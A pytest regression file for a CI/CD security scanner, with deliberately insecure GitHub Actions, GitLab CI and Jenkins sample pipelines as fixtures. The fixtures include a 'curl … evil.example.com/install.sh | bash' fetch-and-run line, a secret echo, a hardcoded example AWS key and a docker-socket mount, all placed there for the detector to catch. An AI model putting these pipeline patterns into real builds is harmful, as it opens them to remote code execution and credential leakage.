"""
CI/CD Security Intelligence (Phase 2.6) — regression.

Runs the engine over realistic GitHub Actions / GitLab CI / Jenkins sample
projects and asserts the canonical findings, platform detection, evidence
(file+line), and the canonical-field contract used by Finding Fusion / Ownership
/ Evidence / Reports.

Run: ``python -m pytest tests/test_cicd_intel.py`` from the backend directory.
"""
from __future__ import annotations

import os
import tempfile

from analyzers import cicd_intel


GH_WORKFLOW = """\
name: CI
on: [push]
permissions: write-all
jobs:
  build:
    runs-on: [self-hosted, linux]
    container:
      image: node:latest
    steps:
      - uses: actions/checkout@main
      - uses: actions/setup-node@v4
      - run: curl https://evil.example.com/install.sh | bash
      - run: echo "${{ secrets.API_TOKEN }}"
      - env:
          AWS_KEY: AKIAIOSFODNN7EXAMPLE
"""

GITLAB_CI = """\
stages: [build]
build:
  script:
    - chmod 777 ./run.sh
    - docker run -v /var/run/docker.sock:/var/run/docker.sock app
  services:
    - name: dind
      privileged: true
"""

JENKINSFILE = """\
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        sh 'sudo apt-get install -y foo'
        sh 'wget -qO- https://x/install.sh | sh'
      }
    }
  }
}
"""


def _write(root, rel, content):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


def _repo():
    tmp = tempfile.TemporaryDirectory()
    _write(tmp.name, ".github/workflows/ci.yml", GH_WORKFLOW)
    _write(tmp.name, ".gitlab-ci.yml", GITLAB_CI)
    _write(tmp.name, "Jenkinsfile", JENKINSFILE)
    _write(tmp.name, "README.md", "# project\n")
    return tmp


def test_platform_detection():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    assert set(out["platforms"]) >= {"github_actions", "gitlab_ci", "jenkins"}
    assert ".github/workflows/ci.yml" in out["files"]
    assert "Jenkinsfile" in out["files"]


def test_github_actions_rules():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    ids = {f["rule_id"] for f in out["findings"]}
    for rid in ("CICD_PERMISSIONS_WRITE_ALL", "CICD_SELF_HOSTED_RUNNER",
                "CICD_ACTION_FLOATING_REF", "CICD_ACTION_UNPINNED",
                "CICD_REMOTE_SCRIPT_EXEC", "CICD_SECRET_ECHO",
                "CICD_HARDCODED_AWS_KEY", "CICD_DOCKER_LATEST"):
        assert rid in ids, f"missing {rid}; got {sorted(ids)}"


def test_gitlab_and_jenkins_rules():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    ids = {f["rule_id"] for f in out["findings"]}
    for rid in ("CICD_CHMOD_777", "CICD_DOCKER_SOCK_MOUNT", "CICD_PRIVILEGED_CONTAINER",
                "CICD_SUDO_USAGE"):
        assert rid in ids, f"missing {rid}; got {sorted(ids)}"


def test_missing_practice_findings():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    ids = {f["rule_id"] for f in out["findings"]}
    # None of the samples reference scanners/signing → these are flagged.
    for rid in ("CICD_MISSING_SECRET_SCANNING", "CICD_MISSING_DEPENDENCY_SCANNING",
                "CICD_MISSING_SAST", "CICD_MISSING_SBOM", "CICD_MISSING_SIGNING_PROVENANCE"):
        assert rid in ids, f"missing {rid}"


def test_canonical_finding_contract():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    assert out["findings"], "expected findings"
    for f in out["findings"]:
        for k in ("title", "severity", "description", "recommendation", "file_path",
                  "line", "snippet", "cwe", "owasp", "source", "references",
                  "confidence", "rule_id"):
            assert f.get(k) not in (None, ""), f"{f.get('rule_id')} missing {k}"
        assert f["source"] == "CI/CD"
        assert f["severity"] in ("critical", "high", "medium", "low", "info")
        assert isinstance(f["line"], int) and f["line"] >= 1
    # The AWS key is critical and points at the real line in the workflow.
    aws = [f for f in out["findings"] if f["rule_id"] == "CICD_HARDCODED_AWS_KEY"]
    assert aws and aws[0]["severity"] == "critical"
    assert aws[0]["file_path"] == ".github/workflows/ci.yml"


def test_floating_vs_unpinned_severity():
    with _repo() as root:
        out = cicd_intel.analyze_tree(root)
    floating = [f for f in out["findings"] if f["rule_id"] == "CICD_ACTION_FLOATING_REF"]
    unpinned = [f for f in out["findings"] if f["rule_id"] == "CICD_ACTION_UNPINNED"]
    assert floating and floating[0]["severity"] == "high"      # @main
    assert unpinned and unpinned[0]["severity"] == "low"       # @v4


def test_clean_repo_has_no_findings():
    with tempfile.TemporaryDirectory() as root:
        _write(root, "README.md", "# nothing to see\n")
        _write(root, "src/app.py", "print('hi')\n")
        out = cicd_intel.analyze_tree(root)
    assert out["findings"] == []
    assert out["platforms"] == []
